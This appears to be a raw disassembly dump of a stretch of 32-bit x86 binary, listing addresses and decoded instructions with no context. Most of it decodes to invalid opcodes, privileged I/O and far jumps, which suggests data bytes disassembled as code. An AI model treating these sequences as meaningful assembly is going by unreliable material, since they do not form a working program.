  4204e2:	repz retf 
  4204e4:	fsubr  st(5),st
  4204e6:	mov    esp,0xf4caafee
  4204eb:	cli    
  4204ec:	sti    
  4204ed:	(bad)  
  4204ef:	out    dx,al
  4204f0:	stc    
  4204f1:	clc    
  4204f2:	neg    dh
  4204f4:	add    edi,esp
  4204f6:	stc    
  4204f7:	(bad)  
  4204f8:	rcl    bl,1
  4204fa:	add    cl,bl
  4204fc:	(bad)  
  4204fd:	call   0x14df9c3
  420502:	repnz add eax,0xefedddcc
  420508:	in     eax,0xee
  42050a:	(bad)  
  42050b:	loope  0x4204f7
  42050d:	int3   
  42050e:	stc    
  42050f:	mov    ebx,0xbae2d3fb
  420514:	cld    
  420515:	shr    esp,1
  420517:	rol    eax,1
  420519:	mov    edx,0xebe3e5ff
  42051e:	add    bh,cl
  420520:	into   
  420521:	dec    BYTE PTR [edi]
  420523:	loope  0x4204d4
  420525:	scas   al,BYTE PTR es:[edi]
  420526:	jecxz  0x420510
  420528:	(bad)  
  42052a:	call   0xc014eae0
  42052f:	repnz (bad) 
  420531:	lock in eax,dx
  420533:	std    
  420534:	mov    ebp,0xe4d2cfd7
  420539:	jmp    0x420517
  42053b:	(bad)  
  42053c:	lock (bad) 
  42053f:	(bad)  
  420540:	loope  0x420545
  420542:	repz out 0xe0,al
  420545:	mov    edi,0xf7e9ebef
  42054a:	loope  0x420531
  42054c:	out    0xfa,eax
  42054e:	stc    
  42054f:	ror    cl,1
  420551:	fdivr  DWORD PTR [edx+edx*8-0x3d232021]
  420558:	icebp  
  420559:	loope  0x420536
  42055b:	(bad)  
  42055c:	shr    cl,1
  42055e:	add    ch,al
  420560:	loope  0x420548
  420562:	repz jmp 0xe60ae933
  420568:	in     eax,0xf7
  42056a:	in     eax,0xee
  42056c:	shl    BYTE PTR [edi-0x3b11081c],0xef
  420573:	cld    
  420574:	mov    ebx,0xc3f3cdc2
  420579:	add    dl,dh
  42057b:	mov    DWORD PTR [ebx],0xdd90fef
  420581:	out    0xe7,eax
  420583:	or     bl,ch
  420585:	in     al,dx
  420586:	rol    edi,1
  420588:	(bad)  
  420589:	cmc    
  42058a:	sti    
  42058b:	leave  
  42058c:	loopne 0x420545
  42058e:	(bad)  
  420590:	fiadd  WORD PTR [ebx]
  420592:	fucomp st(5)
  420594:	iret   
  420595:	stc    
  420596:	fdivp  st(1),st
  420598:	mov    esp,0x3d8d1d2
  42059d:	enter  0xc6f9,0xe3
  4205a1:	cld    
  4205a2:	repz call 0xd10bd289
  4205a8:	mov    ch,0xac
  4205aa:	int3   
  4205ab:	hlt    
  4205ac:	mov    bh,0xd3
  4205ae:	fcomip st,st(1)
  4205b0:	(bad)
  4205b3:	mov    ebx,0xdfe6f3be
  4205b8:	lock jmp 0x4205bb
  4205bb:	jmp    0xc06e7a3
  4205c0:	mov    BYTE PTR [edx],0x12
  4205c3:	fstp   st(6)
  4205c5:	rcl    al,cl
  4205c7:	enter  0xf5f6,0xe1
  4205cb:	call   0xc9f2b4b4
  4205d0:	leave  
  4205d1:	rcl    esp,cl
  4205d3:	sar    ah,cl
  4205d5:	test   ebp,0xebc2bdd8
  4205db:	jmp    0xd8e5:0xdac1d804
  4205e2:	loope  0x4205ee
  4205e4:	(bad)  
  4205e6:	icebp  
  4205e7:	jmp    0xb5cc:0xf6cde7e2
  4205ee:	jmp    0xf8fe:0xddd0f7dd
  4205f5:	add    bh,BYTE PTR [eax-0x3e192108]
  4205fb:	ror    DWORD PTR [ecx],1
  4205fd:	cld    
  4205fe:	out    0xcf,eax
  420600:	push   es
  420601:	in     al,0xde
  420603:	or     ebx,ebp
  420605:	ror    esp,1
  420607:	fst    st(2)
  420609:	mov    bh,0xb4
  42060b:	ret    0xd4cd
  42060e:	in     al,0xcb
  420610:	jmp    0xe0f5:0xffe9fbd9
  420617:	in     al,dx
  420618:	(bad)  
  42061a:	fcmovb st,st(6)
  42061c:	rcr    dl,1
  42061e:	aad    0xcb
  420620:	or     ah,bh
  420622:	pop    es
  420623:	or     al,bl
  420625:	mov    al,0xe0
  420627:	loope  0x420609
  420629:	shl    BYTE PTR [ebp-0x172f3454],0xea
  420630:	shl    ecx,cl
  420632:	mov    ebp,0xeed9e8e9
  420637:	aad    0x0
  420639:	or     esi,esp
  42063b:	add    ah,bl
  42063d:	(bad)  
  42063e:	sti    
  42063f:	aad    0xc5
  420641:	out    0xe3,al
  420643:	or     esp,ebx
  420645:	int3   
  420646:	jecxz  0x42062b
  420648:	out    dx,eax
  420649:	mov    dl,0xe6
  42064b:	shl    ebp,cl
  42064d:	fxch   st(1)
  42064f:	clc    
  420650:	int    0xe8
  420652:	rcr    cl,cl
  420654:	repnz fdivr st,st(0)
  420657:	sti    
  420658:	repnz fcmovnu st,st(5)
  42065b:	fndisi(8087 only) 
  42065d:	sti    
  42065e:	loopne 0x420640
  420660:	or     ecx,esi
  420662:	in     al,0xdf
  420664:	rcr    esp,0xc7
  420667:	icebp  
  420668:	retf   
  420669:	mov    ah,0xe0
  42066b:	sti    
  42066c:	aam    0xd3
  42066e:	rcl    al,1
  420670:	fidiv  WORD PTR [ebp-0x41270c2d]
  420676:	loopne 0x42065f
  420678:	in     eax,dx
  420679:	loope  0x42064e
  42067b:	add    ebx,ebp
  42067d:	stc    
  42067e:	or     ebp,edi
  420680:	stc    
  420681:	add    eax,0xeeecdcdb
  420686:	iret   
  420687:	out    0xdc,eax
  420689:	mov    dh,0xe9
  42068b:	retf   
  42068c:	icebp  
  42068d:	lds    edi,FWORD PTR [edx-0x1137471a]
  420693:	sar    BYTE PTR [edx-0x4109ff43],cl
  420699:	mov    edx,0xf5f5e6d2
  42069e:	out    dx,eax
  42069f:	in     eax,dx
  4206a0:	(bad)  
  4206a1:	(bad)  
  4206a3:	(bad)  
  4206a4:	out    dx,eax
  4206a5:	xlat   BYTE PTR ds:[ebx]
  4206a6:	mov    bl,0xe6
  4206a8:	mov    bl,0xca
  4206aa:	lods   eax,DWORD PTR ds:[esi]
  4206ab:	(bad)  
  4206ac:	(bad)  
  4206ad:	int3   
  4206ae:	into   
  4206af:	neg    al
  4206b1:	imul   esi
  4206b3:	ret    0xc1f0
  4206b6:	out    0x7,eax
  4206b8:	fsubrp st(3),st
  4206ba:	clc    
  4206bb:	or     eax,ebx
  4206bd:	push   es
  4206be:	(bad)  
  4206bf:	or     BYTE PTR [esp+eax*1],al
  4206c2:	into   
  4206c3:	adc    ch,BYTE PTR [esi-0x36413a11]
  4206c9:	jecxz  0x42068b
  4206cb:	mov    ch,0xc6
  4206cd:	(bad)  
  4206ce:	xlat   BYTE PTR ds:[ebx]
  4206cf:	mov    ch,0xb7
  4206d1:	call   edx
  4206d3:	rcl    ch,cl
  4206d5:	loop   0x4206a3
  4206d7:	inc    ecx
  4206d9:	fiadd  DWORD PTR ds:0xd9c406d4
  4206df:	loopne 0x4206c9
  4206e1:	fucomi st,st(3)
  4206e3:	int3   
  4206e4:	stos   DWORD PTR es:[edi],eax
  4206e5:	rcr    ch,cl
  4206e7:	(bad)
  4206eb:	retf   
  4206ec:	enter  0xb0c8,0xec
  4206f0:	(bad)  
  4206f2:	idiv   DWORD PTR [ecx-0x330e2bfd]
  4206f8:	clc    
  4206f9:	out    0x1,al
  4206fb:	cmc    
  4206fc:	fadd   DWORD PTR [ebx]
  4206fe:	out    0xeb,eax
  420700:	fcos   
  420702:	retf   0xbe12
  420705:	fadd   st,st(2)
  420707:	(bad)  
  420708:	rol    ah,1
  42070a:	shl    cl,0xc0
  42070d:	in     al,dx
  42070e:	cmc    
  42070f:	idiv   BYTE PTR [esi-0x815260e]
  420715:	repz add ebx,edx
  420718:	in     eax,dx
  420719:	(bad)  
  42071b:	fcomi  st,st(6)
  42071d:	or     eax,eax
  42071f:	(bad)  
  420720:	out    dx,eax
  420721:	ret    0xf3
  420724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420725:	test   eax,0xaec3e6d6
  42072a:	in     al,0xec
  42072c:	fcmovb st,st(7)
  42072e:	(bad)  
  42072f:	(bad)  
  420730:	in     al,dx
  420731:	retf   0xe8c3
  420734:	mov    edx,0xde03f5c1
  420739:	lds    eax,FWORD PTR [esi]
  42073b:	cli    
  42073c:	jecxz  0x42071b
  42073e:	enter  0xebf6,0xca
  420742:	in     al,dx
  420743:	icebp  
  420744:	(bad)  [edi+edi*4-0x2c4e304d]
  42074b:	shl    DWORD PTR [eax-0x3107302f],cl
  420751:	mov    esi,0x3fddbee
  420756:	clc    
  420757:	out    0xcc,al
  420759:	add    al,0xbc
  42075b:	out    0xca,al
  42075d:	or     esi,ebp
  42075f:	or     edi,ecx
  420761:	retf   
  420762:	loopne 0x420773
  420764:	icebp  
  420765:	mov    esi,0xf7d2e6b2
  42076a:	shl    bh,cl
  42076c:	leave  
  42076d:	into   
  42076e:	fidivr DWORD PTR [esi-0x31094536]
  420774:	add    al,dl
  420776:	sti    
  420777:	fdiv   st,st(0)
  420779:	(bad)  
  42077b:	loopne 0x42077f
  42077d:	(bad)  
  42077e:	retf   0xe702
  420781:	push   cs
  420782:	fstp   st(5)
  420784:	(bad)  
  420785:	in     eax,0xde
  420787:	lods   eax,DWORD PTR ds:[esi]
  420788:	cmc    
  420789:	mov    bh,0xd7
  42078b:	call   0xea2bd340
  420790:	ror    eax,1
  420792:	aad    0xed
  420794:	iret   
  420795:	into   
  420796:	into   
  420797:	dec    ebp
  420799:	lock out 0xcb,al
  42079c:	call   0x1f0289
  4207a1:	iret   
  4207a2:	or     eax,0xc4aae1e3
  4207a7:	call   0xe93df796
  4207ac:	(bad)  
  4207ad:	mov    ah,0xce
  4207af:	cli    
  4207b0:	fnstsw WORD PTR [ecx-0x420f0c34]
  4207b6:	rcr    ebp,cl
  4207b8:	ret    0xfcdc
  4207bb:	fsub   st,st(6)
  4207bd:	add    dh,ch
  4207bf:	out    dx,eax
  4207c0:	add    eax,ebx
  4207c2:	rcr    ecx,cl
  4207c4:	fmul   st(1),st
  4207c6:	retf   
  4207c7:	iret   
  4207c8:	int3   
  4207c9:	loopne 0x4207ae
  4207cb:	ror    bh,cl
  4207cd:	mov    bh,0xce
  4207cf:	in     eax,dx
  4207d0:	in     al,0xda
  4207d2:	mov    ebp,0xd2f4f8f4
  4207d7:	cmc    
  4207d8:	std    
  4207d9:	out    0xc7,eax
  4207db:	mov    edi,0xfcfce9fe
  4207e1:	or     al,0xcd
  4207e3:	jmp    0xf620eda5
  4207e8:	jmp    0xf2ea:0xe9e5d4ed
  4207ef:	cmc    
  4207f0:	rcl    ebp,1
  4207f2:	rol    BYTE PTR [edx],1
  4207f4:	aam    0xc0
  4207f6:	loopne 0x4207cf
  4207f8:	mov    ebp,0xd00acbf2
  4207fd:	clc    
  4207fe:	fsincos 
  420800:	(bad)  
  420801:	fcmovu st,st(2)
  420803:	adc    ebp,ecx
  420805:	mov    eax,0xe2cab6dc
  42080a:	mov    dh,0xf6
  42080c:	clc    
  42080d:	sti    
  42080e:	sar    DWORD PTR [edi-0x123c2b33],1
  420814:	cli    
  420815:	shr    bh,1
  420817:	out    dx,al
  420818:	fcomip st,st(1)
  42081a:	add    eax,0xf9d5e2dd
  42081f:	pop    es
  420820:	clc    
  420821:	fucomi st,st(5)
  420823:	cli    
  420824:	(bad)  
  420825:	(bad)  
  420826:	int    0xe6
  420828:	out    0xb6,eax
  42082a:	shr    dh,cl
  42082c:	xlat   BYTE PTR ds:[ebx]
  42082d:	mov    dl,0xb9
  42082f:	jmp    0x420800
  420831:	repnz aad 0x2
  420834:	fmul   st(0),st
  420836:	rcl    ecx,cl
  420838:	in     al,dx
  420839:	ror    BYTE PTR [edx],0x5
  42083c:	fcmovnb st,st(5)
  42083e:	push   cs
  42083f:	mov    DWORD PTR [esi],0xdde9ee13
  420845:	fidivr WORD PTR [ebp-0xf152e20]
  42084b:	icebp  
  42084c:	test   ah,0xd8
  42084f:	(bad)  
  420850:	sti    
  420851:	lock icebp 
  420853:	loop   0x420850
  420855:	rcl    cl,0xf8
  420858:	imul   ah
  42085a:	or     dh,al
  42085c:	leave  
  42085d:	paddd  mm3,mm2
  420860:	jmp    0x420856
  420862:	ror    ebp,cl
  420864:	mov    eax,0xf0b2c7e3
  420869:	out    dx,eax
  42086a:	icebp  
  42086b:	(bad)  
  42086d:	cli    
  42086e:	call   0xb4f9065b
  420873:	lock add ebx,edx
  420876:	(bad)  
  420877:	icebp  
  420878:	in     eax,dx
  420879:	add    BYTE PTR ds:0xc1ebcb00,al
  42087f:	fdivp  st(5),st
  420881:	in     eax,dx
  420882:	adc    dh,cl
  420884:	stos   DWORD PTR es:[edi],eax
  420885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420886:	(bad)  
  420887:	mov    bl,0xe4
  420889:	retf   0xe6d5
  42088c:	(bad)  
  42088d:	int3   
  42088e:	fdivr  st,st(3)
  420890:	(bad)  
  420891:	cli    
  420892:	xlat   BYTE PTR ds:[ebx]
  420893:	mov    eax,0xf2d0b8f8
  420898:	mov    DWORD PTR [ebx],0xc5f6d804
  42089e:	jmp    0xabfe:0xfe0dece5
  4208a5:	fst    st(7)
  4208a7:	test   al,0xc6
  4208a9:	rcl    bh,cl
  4208ab:	stc    
  4208ac:	iret   
  4208ad:	out    0xc6,al
  4208af:	rcr    dh,1
  4208b1:	mov    ebx,0xc8fcedb5
  4208b6:	mov    esp,0xddf3f1dc
  4208bb:	jecxz  0x4208b6
  4208bd:	retf   
  4208be:	not    esp
  4208c0:	or     eax,DWORD PTR [ebx]
  4208c2:	leave  
  4208c3:	adc    esi,ebx
  4208c5:	jecxz  0x420873
  4208c7:	int    0xf7
  4208c9:	shl    ch,1
  4208cb:	mov    dl,0xe5
  4208cd:	mov    bh,0xbf
  4208cf:	not    eax
  4208d1:	into   
  4208d2:	mov    eax,0xe7cdeffe
  4208d7:	(bad)  
  4208d9:	mul    ah
  4208db:	les    eax,FWORD PTR [esi]
  4208dd:	shr    bl,1
  4208df:	std    
  4208e0:	push   cs
  4208e1:	add    ebx,esi
  4208e3:	loop   0x4208b6
  4208e5:	scas   eax,DWORD PTR es:[edi]
  4208e6:	scas   eax,DWORD PTR es:[edi]
  4208e7:	int3   
  4208e8:	into   
  4208e9:	out    0xca,eax
  4208eb:	mov    dl,0xcb
  4208ed:	stc    
  4208ee:	sti    
  4208ef:	aam    0xc9
  4208f1:	sar    dh,1
  4208f3:	xlat   BYTE PTR ds:[ebx]
  4208f4:	leave  
  4208f5:	pop    es
  4208f6:	(bad)  
  4208f7:	fcmovb st,st(6)
  4208f9:	loop   0x4208de
  4208fb:	(bad)  
  4208fc:	add    cl,BYTE PTR [eax]
  4208fe:	out    dx,eax
  4208ff:	or     eax,0x6fbcbe6
  420904:	test   eax,0xf3ece8de
  420909:	cmc    
  42090a:	lock out dx,al
  42090c:	in     al,0xf7
  42090e:	leave  
  42090f:	iret   
  420910:	aam    0xc8
  420912:	int3   
  420913:	mov    ebx,0xf3d9f7ba
  420918:	(bad)  
  420919:	mov    ebp,0xcbe002f4
  42091e:	loope  0x420906
  420920:	in     al,0xe7
  420922:	add    ebp,ebp
  420924:	leave  
  420925:	fdivr  QWORD PTR [ebp-0x17122e43]
  42092b:	(bad)  
  42092c:	scas   eax,DWORD PTR es:[edi]
  42092d:	mov    bh,0xea
  42092f:	cli    
  420930:	jmp    0xedba:0xb7dbd2f1
  420937:	loope  0x42091c
  420939:	cmc    
  42093a:	std    
  42093b:	in     eax,0xd1
  42093d:	add    eax,ebp
  42093f:	into   
  420940:	add    esp,edi
  420942:	or     eax,0xbeaeea0c
  420947:	mov    al,0xc7
  42094a:	jmp    0x42090e
  42094c:	out    0xf1,eax
  42094e:	mov    edi,0xddeee5f4
  420953:	add    ecx,ecx
  420955:	add    edx,esi
  420957:	(bad)  
  420958:	rol    dh,cl
  42095a:	ret    
  42095b:	clc    
  42095c:	(bad)  
  42095d:	leave  
  42095e:	loopne 0x42092a
  420960:	into   
  420961:	add    edx,edi
  420963:	out    dx,al
  420964:	call   0xc41eec53
  420969:	jmp    0xf326e161
  42096e:	mov    al,0xd3
  420970:	mov    ebp,0xdbeed6bd
  420975:	mov    esp,0xf1fffacc
  42097a:	out    0x6,al
  42097c:	rol    bh,0x2
  42097f:	add    esp,ebx
  420981:	paddsw mm6,mm2
  420984:	mov    bl,0xe2
  420986:	scas   eax,DWORD PTR es:[edi]
  420987:	icebp  
  420988:	lock (bad) 
  42098a:	icebp  
  42098b:	ret    0xf3ba
  42098e:	out    dx,eax
  42098f:	aad    0xb9
  420991:	shl    esp,cl
  420993:	add    ebx,esp
  420995:	mov    edi,0xf8ec05da
  42099a:	stc    
  42099b:	(bad)  
  42099c:	inc    DWORD PTR [ebx]
  42099e:	aam    0xc5
  4209a0:	cld    
  4209a1:	or     al,0xec
  4209a3:	cld    
  4209a4:	leave  
  4209a5:	repnz (bad) 
  4209a7:	repnz mov bl,0xdb
  4209aa:	mov    dh,0xea
  4209ac:	in     al,0xce
  4209ae:	out    dx,eax
  4209af:	fcmovbe st,st(0)
  4209b1:	lock repnz icebp 
  4209b4:	fdivrp st(1),st
  4209b6:	ret    
  4209b7:	(bad)  
  4209b9:	cli    
  4209ba:	sti    
  4209bb:	retf   
  4209bc:	ret    
  4209bd:	add    ebx,ebx
  4209bf:	fsub   st,st(5)
  4209c1:	fisttp WORD PTR [ecx+ecx*1]
  4209c4:	loopne 0x420987
  4209c6:	(bad)  
  4209c7:	loope  0x420980
  4209c9:	shl    cl,0xd2
  4209cc:	sar    DWORD PTR [ebx-0x313b3a4b],0xec
  4209d3:	mov    ebx,0xe1fdf2c3
  4209d8:	add    eax,0x301f4ff
  4209dd:	in     eax,0xee
  4209df:	jmp    0x4209a8
  4209e1:	(bad)  
  4209e2:	int    0xf8
  4209e4:	mov    dl,0xc4
  4209e6:	int    0xc0
  4209e8:	mov    dh,0xe5
  4209ea:	rcl    ch,0xfa
  4209ed:	mov    ah,0xf4
  4209ef:	enter  0xcad5,0xdc
  4209f3:	cld    
  4209f4:	loope  0x4209d5
  4209f6:	(bad)  
  4209f7:	cli    
  4209f8:	cli    
  4209f9:	xlat   BYTE PTR ds:[ebx]
  4209fa:	(bad)  
  4209fb:	(bad)
  4209fe:	retf   
  4209ff:	jmp    0xcdc7:0xcf120be1
  420a06:	int    0xb3
  420a08:	lods   al,BYTE PTR ds:[esi]
  420a09:	ror    ecx,0xce
  420a0c:	mov    ch,0xc7
  420a0e:	jmp    0x4209c6
  420a10:	mov    ecx,0xb7c2b1c4
  420a15:	hlt    
  420a16:	out    dx,al
  420a17:	in     eax,dx
  420a18:	ret    
  420a19:	fild   WORD PTR [ecx+ebx*8]
  420a1c:	loopne 0x4209fd
  420a1e:	clc    
  420a1f:	retf   
  420a20:	(bad)  
  420a22:	in     eax,0x4
  420a24:	lods   al,BYTE PTR ds:[esi]
  420a25:	in     al,0xbc
  420a27:	loopne 0x420a13
  420a29:	repz (bad) 
  420a2b:	xlat   BYTE PTR ds:[ebx]
  420a2c:	(bad)
  420a2f:	mov    edi,0xe2f5ffb4
  420a34:	out    dx,al
  420a35:	pop    es
  420a36:	sti    
  420a37:	cli    
  420a38:	hlt    
  420a39:	cli    
  420a3a:	add    al,0xfd
  420a3c:	hlt    
  420a3d:	fsubrp st(7),st
  420a3f:	push   es
  420a40:	enter  0x12ea,0xdf
  420a44:	scas   eax,DWORD PTR es:[edi]
  420a45:	lods   eax,DWORD PTR ds:[esi]
  420a46:	int3   
  420a47:	ret    
  420a48:	(bad)  
  420a49:	loope  0x420a1b
  420a4b:	mov    dh,0xd0
  420a4d:	call   0xeaf8c11a
  420a52:	repnz fcom st(4)
  420a55:	fld    DWORD PTR [esi]
  420a57:	(bad)  
  420a58:	cmc    
  420a59:	not    ebp
  420a5b:	fiadd  DWORD PTR [ebx]
  420a5d:	or     dh,ch
  420a5f:	retf   
  420a60:	sti    
  420a61:	add    al,0x8
  420a63:	or     DWORD PTR [ebx+ecx*8-0xe48482a],ebp
  420a6a:	call   0xd61af126
  420a6f:	out    0xd2,al
  420a71:	(bad)  
  420a72:	jmp    0x420a57
  420a74:	stc    
  420a75:	mov    ebp,0xfae5beec
  420a7a:	fcomp  st(6)
  420a7c:	rcr    esp,1
  420a7e:	call   0xf42cf852
  420a83:	(bad)  
  420a84:	lock in al,0xde
  420a87:	xlat   BYTE PTR ds:[ebx]
  420a88:	mov    bl,0xe6
  420a8a:	iret   
  420a8b:	repnz xlat BYTE PTR ds:[ebx]
  420a8d:	(bad)  
  420a8f:	retf   0xddba
  420a92:	mov    ecx,0xd3d5c202
  420a97:	fdivr  st,st(6)
  420a99:	add    DWORD PTR [edi],eax
  420a9b:	test   dl,0x6
  420a9e:	(bad)  
  420a9f:	fisttp WORD PTR [eax+eax*1]
  420aa2:	shl    edx,cl
  420aa4:	out    0xe3,al
  420aa6:	enter  0xbccf,0xe3
  420aaa:	leave  
  420aab:	out    0xce,eax
  420aad:	icebp  
  420aae:	retf   0xb6b7
  420ab1:	repnz std 
  420ab3:	jmp    0xdded:0x7d9e0f8
  420aba:	(bad)  
  420abc:	in     al,0xc2
  420abe:	xlat   BYTE PTR ds:[ebx]
  420abf:	stc    
  420ac0:	add    al,0xa
  420ac2:	int3   
  420ac3:	dec    dl
  420ac5:	icebp  
  420ac6:	out    0xe8,al
  420ac8:	rol    bl,1
  420aca:	shl    DWORD PTR [edx-0x1053511],0xfc
  420ad1:	mov    ah,0xc8
  420ad3:	mov    ecx,0xe2d2e2f0
  420ad8:	sti    
  420ad9:	sar    dl,0xfa
  420adc:	cld    
  420add:	shr    dl,0xd9
  420ae0:	or     al,bh
  420ae2:	into   
  420ae3:	sar    DWORD PTR [eax-0x431d1d48],cl
  420ae9:	mov    ah,0xf6
  420aeb:	repz jmp 0xcbd8:0xb5d5cacb
  420af3:	mov    ebx,0xd2ecf2fc
  420af8:	(bad)  
  420afa:	lds    eax,FWORD PTR [ebx]
  420afc:	out    0x4,eax
  420afe:	jecxz  0x420b08
  420b00:	or     eax,0xabd2cbe3
  420b05:	mov    edi,0xebd4c6cc
  420b0a:	rol    esp,cl
  420b0c:	jmp    0xb3fd04dc
  420b11:	aad    0xed
  420b13:	enter  0xe7bf,0xf6
  420b17:	int3   
  420b18:	in     al,0xe5
  420b1a:	add    eax,0x9e4f4db
  420b1f:	ror    BYTE PTR [edi],0x6
  420b22:	out    0xe6,al
  420b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b25:	loopne 0x420afe
  420b27:	lds    esi,FWORD PTR [eax-0x48313e4d]
  420b2d:	mov    bh,0xbb
  420b2f:	leave  
  420b30:	push   esp
  420b32:	repnz aad 0xc1
  420b35:	aad    0xfe
  420b37:	mov    esp,0xde00f2c6
  420b3c:	icebp  
  420b3d:	add    esp,eax
  420b3f:	paddsb mm0,QWORD PTR ds:0xdde6cfe8
  420b46:	retf   0xb0bd
  420b49:	leave  
  420b4a:	fcmovbe st,st(1)
  420b4c:	rcr    edi,1
  420b4e:	(bad)  
  420b4f:	aam    0xbf
  420b51:	fdiv   QWORD PTR [ecx-0xb060904]
  420b57:	sar    al,cl
  420b59:	(bad)  
  420b5b:	out    0xc0,eax
  420b5d:	in     al,0xbd
  420b5f:	mov    esp,0xcac5d906
  420b64:	out    0xaf,al
  420b66:	mov    bh,0xc0
  420b68:	(bad)
  420b6b:	xlat   BYTE PTR ds:[ebx]
  420b6c:	scas   eax,DWORD PTR es:[edi]
  420b6d:	iret   
  420b6e:	(bad)  
  420b70:	out    dx,al
  420b71:	mov    ch,0xe3
  420b73:	fcom   st(4)
  420b75:	lock sti 
  420b77:	int3   
  420b78:	shl    esi,1
  420b7a:	test   edx,0xd6cbc6e0
  420b80:	loop   0x420b86
  420b82:	fisttp WORD PTR [edi+edi*4]
  420b85:	loop   0x420b50
  420b87:	leave  
  420b88:	iret   
  420b89:	loope  0x420b42
  420b8b:	(bad)  
  420b8c:	in     al,dx
  420b8d:	mov    ecx,0xddeeeee4
  420b92:	iret   
  420b93:	ret    0xdafa
  420b96:	fidivr WORD PTR [esi-0x38080114]
  420b9c:	rcr    edx,0x0
  420b9f:	shl    cl,0xc2
  420ba2:	push   cs
  420ba3:	fsubp  st(5),st
  420ba5:	iret   
  420ba6:	(bad)  
  420ba8:	cmc    
  420ba9:	mov    bl,0xb3
  420bab:	rol    ecx,cl
  420bad:	out    0xb0,eax
  420baf:	hlt    
  420bb0:	in     al,0xd3
  420bb2:	cld    
  420bb3:	mov    esi,0xfed9f1fd
  420bb8:	fistp  QWORD PTR [esi-0x2b2520]
  420bbe:	jmp    0xc636d6be
  420bc3:	add    al,ah
  420bc5:	test   eax,0xb2c1e5c1
  420bca:	mov    bh,0xea
  420bcc:	int    0xe8
  420bce:	mov    bh,0xf7
  420bd0:	mov    ebp,0xbbb4b4fd
  420bd5:	ffreep st(1)
  420bd7:	(bad)  
  420bd8:	add    al,0xe2
  420bda:	cmc    
  420bdb:	jmp    ebx
  420bdd:	add    BYTE PTR [eax],al
  420bdf:	jmp    0x420bd6
  420be1:	adc    ebp,ecx
  420be3:	fldl2t 
  420be5:	mov    al,0xf6
  420be7:	aad    0xc1
  420be9:	call   0xc8f6c2c8
  420bee:	jmp    0xf245def0
  420bf3:	mov    edi,0x1daffc1
  420bf8:	(bad)  
  420bf9:	sar    esp,0xd9
  420bfc:	loop   0x420bd3
  420bfe:	clc    
  420bff:	retf   0x3ee
  420c02:	in     al,0xcb
  420c04:	lock rol esi,1
  420c07:	in     al,dx
  420c08:	mov    dh,0xf1
  420c0a:	int3   
  420c0b:	jmp    0x420bc2
  420c0d:	shl    dh,0xed
  420c10:	mov    edx,0xd2b9f7de
  420c15:	int3   
  420c16:	fdivr  st,st(3)
  420c18:	cld    
  420c19:	xlat   BYTE PTR ds:[ebx]
  420c1a:	aad    0xd1
  420c1c:	rcl    ah,1
  420c1e:	(bad)  
  420c20:	out    0x9,eax
  420c22:	retf   0xeceb
  420c25:	in     eax,dx
  420c26:	mov    esp,0xc0b3cce1
  420c2b:	out    0xe8,eax
  420c2d:	(bad)  
  420c2e:	(bad)  
  420c30:	retf   0xf5fd
  420c33:	fsubp  st(5),st
  420c35:	aam    0xc3
  420c37:	(bad)  
  420c38:	fdiv   st,st(2)
  420c3a:	loope  0x420c39
  420c3c:	loopne 0x420c45
  420c3e:	stc    
  420c3f:	out    dx,al
  420c40:	in     eax,dx
  420c41:	out    0xe3,al
  420c43:	iret   
  420c44:	rol    cl,0xf3
  420c47:	mov    bh,0xb6
  420c49:	retf   0xe4e8
  420c4c:	fcmovnbe st,st(5)
  420c4e:	cmc    
  420c4f:	enter  0xdedb,0xf0
  420c53:	(bad)  
  420c54:	mov    ecx,0xd9befcd1
  420c59:	rcr    eax,0xe7
  420c5c:	hlt    
  420c5d:	pandn  mm1,QWORD PTR [edi]
  420c60:	loopne 0x420c5e
  420c62:	call   0xde08ee30
  420c67:	enter  0xe6d1,0xc2
  420c6b:	les    esi,FWORD PTR [edx-0xa290548]
  420c71:	retf   0xd4f1
  420c74:	out    dx,eax
  420c75:	cmc    
  420c76:	mov    edi,0xdbe500ee
  420c7b:	retf   0xdae1
  420c7e:	or     esp,esp
  420c80:	add    dl,bl
  420c82:	leave  
  420c83:	fld    st(4)
  420c85:	(bad)  
  420c86:	mov    cl,0xe5
  420c88:	in     eax,0xb1
  420c8a:	iret   
  420c8b:	lock (bad) 
  420c8d:	int    0xc5
  420c8f:	leave  
  420c90:	out    dx,eax
  420c91:	mov    edi,0xbcd4bcdd
  420c96:	out    dx,eax
  420c97:	cmc    
  420c98:	icebp  
  420c99:	repz (bad) 
  420c9b:	ret    0xc8da
  420c9e:	out    0xc8,al
  420ca0:	ret    
  420ca1:	pop    es
  420ca2:	(bad)  
  420ca3:	jmp    0xe0cf:0xc2e5e2d9
  420caa:	repz into 
  420cac:	in     al,0xdf
  420cae:	int    0xfb
  420cb0:	cld    
  420cb1:	fsub   st(1),st
  420cb3:	mov    edi,0xcebed7f8
  420cb8:	shl    edi,cl
  420cba:	add    esp,ecx
  420cbc:	pop    es
  420cbd:	jmp    0xcbcc:0xdcdc09e1
  420cc4:	mov    eax,0xcce3e0b2
  420cc9:	(bad)  
  420cca:	mov    bl,0xef
  420ccc:	test   ah,0xfe
  420ccf:	cli    
  420cd0:	in     al,0xf2
  420cd2:	sar    DWORD PTR [edi-0x470d2b08],1
  420cd8:	not    edi
  420cda:	(bad)  
  420cdb:	(bad)  
  420cdc:	out    0xd4,al
  420cde:	(bad)  
  420ce0:	cld    
  420ce1:	enter  0x4c5,0xc0
  420ce5:	jmp    0xcee6:0xe3e0d3ac
  420cec:	xlat   BYTE PTR ds:[ebx]
  420ced:	repnz retf 0xcbe9
  420cf1:	mov    ebx,0xe0dddeed
  420cf6:	sar    ah,1
  420cf8:	(bad)  
  420cf9:	(bad)  
  420cfa:	fild   WORD PTR [edi+eiz*8]
  420cfd:	fucomi st,st(7)
  420cff:	push   es
  420d00:	(bad)
  420d03:	rcr    eax,cl
  420d05:	repnz iret 
  420d07:	int3   
  420d08:	loopne 0x420cde
  420d0a:	shl    edx,cl
  420d0c:	call   0xdf1ccd02
  420d11:	(bad)  [edi+edi*4-0x240d4520]
  420d18:	clc    
  420d19:	cmc    
  420d1a:	rol    al,1
  420d1c:	(bad)  
  420d1e:	(bad)  
  420d1f:	fcmove st,st(6)
  420d21:	add    ecx,DWORD PTR [eax]
  420d23:	push   cs
  420d24:	stos   BYTE PTR es:[edi],al
  420d25:	scas   al,BYTE PTR es:[edi]
  420d26:	mov    esp,0xbbcfddc9
  420d2b:	(bad)  
  420d2c:	jmp    0xf4cf:0xe5f4b0db
  420d33:	call   0xd300070f
  420d38:	sar    ecx,0xd1
